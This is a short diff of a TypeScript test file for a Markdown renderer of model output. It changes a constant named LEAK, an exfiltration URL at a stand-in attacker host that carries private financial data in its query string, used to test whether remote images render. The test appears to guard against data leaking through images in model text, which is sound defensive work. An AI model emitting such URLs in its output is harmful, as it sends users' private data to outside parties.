@@ -24,7 +24,7 @@ function render(markdown: string, safe = true): string {
   );
 }
 
-const LEAK = "https://attacker.example/collect?d=Kestrel%20owes%20%2412%2C400";
+const LEAK = "https://attacker.example/collect?d=Contoso%20owes%20%2412%2C400";
 
 describe("model text as Markdown", () => {
   it("renders Streamdown's defaults with the remote image (why this module exists)", () => {
